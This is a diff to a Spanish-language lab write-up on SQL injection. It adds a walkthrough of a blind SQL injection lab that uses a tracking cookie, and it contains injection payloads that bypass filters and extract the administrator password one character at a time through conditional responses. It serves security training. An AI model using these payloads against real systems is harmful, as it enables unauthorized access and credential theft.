@@ -48,7 +48,7 @@ Lo ponemos en la búsqueda.
 ?category=Gifts' OR 1=1--'
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Lab: SQL injection vulnerability allowing login bypass
 
@@ -295,3 +295,28 @@ La segunda columna es la que sí acepta cadena de texto pero claro la informaci�
 Ya hemos conseguido las credenciales, vamos a loguearnos.
 
 <figure><img src="../../.gitbook/assets/image (1441).png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Blind SQL injection with conditional responses
+
+### Enunciado
+
+Este laboratorio contiene una **vulnerabilidad de inyección SQL ciega (blind SQL injection)**. La aplicación usa una **cookie de seguimiento** para análisis, y realiza una consulta SQL que incluye el valor de esa cookie.
+
+Los resultados de la consulta **no se devuelven directamente** y **no se muestran mensajes de error**. Sin embargo, la aplicación **muestra un mensaje de "Welcome back" en la página si la consulta devuelve alguna fila**.
+
+La base de datos contiene una tabla diferente llamada **`users`**, con columnas **`username`** y **`password`**. **Explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario `administrator`, e iniciar sesión como dicho usuario.**
+
+### Resolución
+
+A diferencia de los laboratorios anteriores la vulnerabilidad está en **TrackingID**.
+
+```
+ID'+and+(select+username+from+users+where+username%3d'administrator'+and+LENGTH(password)>1)%3d'administrator'--;
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+```
+ID' and (select substring (password,1,1) from users where username='administrator')='a'--
+```
+
